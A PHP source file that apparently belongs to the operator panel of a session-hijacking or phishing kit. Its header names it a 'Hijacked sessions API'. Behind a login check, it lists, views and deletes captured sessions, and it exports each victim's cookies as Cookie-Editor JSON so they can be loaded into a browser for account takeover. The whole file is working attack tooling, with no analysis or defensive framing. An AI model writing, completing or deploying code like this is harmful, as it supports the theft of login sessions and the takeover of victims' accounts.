<?php
/**
 * api/sessions.php — Hijacked sessions API.
 *
 * GET  ?action=list[&slug=...]   → list sessions
 * GET  ?action=get&id=N          → single session detail
 * GET  ?action=export&id=N       → download Cookie-Editor JSON
 * POST ?action=delete&id=N       → delete session
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/store.php';
auth_boot();
auth_require();

header('Content-Type: application/json; charset=utf-8');

$action = $_GET['action'] ?? $_POST['action'] ?? 'list';

try {
    switch ($action) {
        case 'list':
            $slug = $_GET['slug'] ?? null;
            $sessions = store_session_list($slug);
            echo json_encode(['ok' => true, 'sessions' => $sessions, 'total' => count($sessions)]);
            break;

        case 'get':
            $id = (int) ($_GET['id'] ?? 0);
            if ($id <= 0) throw new RuntimeException('Invalid session ID');
            $session = store_session_get($id);
            if ($session === null) throw new RuntimeException('Session not found');
            echo json_encode(['ok' => true, 'session' => $session]);
            break;

        case 'export':
            $id = (int) ($_GET['id'] ?? 0);
            if ($id <= 0) throw new RuntimeException('Invalid session ID');
            $session = store_session_get($id);
            if ($session === null) throw new RuntimeException('Session not found');
            header('Content-Type: application/json; charset=utf-8');
            header('Content-Disposition: attachment; filename="session-' . $id . '-cookies.json"');
            echo json_encode($session['cookie_editor'], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
            exit;

        case 'delete':
            if ($_SERVER['REQUEST_METHOD'] !== 'POST') throw new RuntimeException('POST required');
            $id = (int) ($_POST['id'] ?? $_GET['id'] ?? 0);
            if ($id <= 0) throw new RuntimeException('Invalid session ID');
            $ok = store_session_delete($id);
            echo json_encode(['ok' => $ok]);
            break;

        default:
            throw new RuntimeException('Unknown action: ' . $action);
    }
} catch (RuntimeException $e) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
}
